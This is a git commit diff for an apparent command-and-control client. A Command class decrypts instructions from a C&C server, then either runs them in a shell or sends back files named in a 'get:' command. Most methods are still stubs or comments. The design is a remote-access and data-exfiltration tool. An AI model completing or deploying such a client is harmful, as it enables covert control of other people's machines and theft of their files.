19aad969136641d07cdd5322e5523a70ebe0733f
devhid <devhid@users.noreply.github.com>
2019-03-28 02:31:47 -0400

    Fixed concepts/typos

--- client/command.py
+++ client/command.py
@@ -1,13 +1,18 @@
 class Command:
     """ A class for handling the command sent by the C&C server. """
 
-    def __init__(self, encoded_command):
-        self.cmd = encoded_command
+    def __init__(self, encrypted_command):
+        self.cmd = encrypted_command
     
-    def decode(self):
-        """ Decodes the encoded command into a shell command. """
+    def decrypt(self):
+        """ Decrypts the encrypted command into either a shell command or file retrieval command. """
         pass
     
     def execute(self):
-        """ Executes the command in a shell environment . """
-        pass
+        """ Executes the command based on the type of command. """
+        decrypted = self.decrypt(self.cmd)
+        
+        # if decrypted starts with "get:"
+            # send data from <path>
+        # else
+            # execute command in shell environment
--- client/request_type.py
+++ client/request_type.py
@@ -4,5 +4,5 @@ class RequestType(Enum):
     """ Enum that represents the type of request that is sent. """
 
     PING = 0, # sent periodically to check if the server has a command
-    DATA = 1, # any data requested from the execution of the command sent by the server
-    RECEIPT = 2 # a receipt of the success (or failure) of the execution of a command
+    DATA = 1, # sent when a file retrieval command is issued for transmission of data
+    RECEIPT = 2 # a receipt of the success (or failure) of the execution of a shell command
